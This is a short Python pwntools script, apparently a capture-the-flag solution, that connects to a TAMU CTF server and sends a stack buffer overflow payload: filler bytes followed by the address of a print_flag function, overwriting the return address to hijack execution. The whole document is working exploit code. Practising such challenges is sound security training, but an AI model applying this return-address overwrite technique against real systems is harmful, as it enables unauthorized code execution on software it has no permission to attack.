from pwn import *

s = remote("pwn.ctf.tamu.edu", 4322)

print_flag = 0x804854b

payload = "A"*(0xEF + 4)
payload += p32(print_flag)

s.sendline(payload)

sleep(1)
print s.recv()
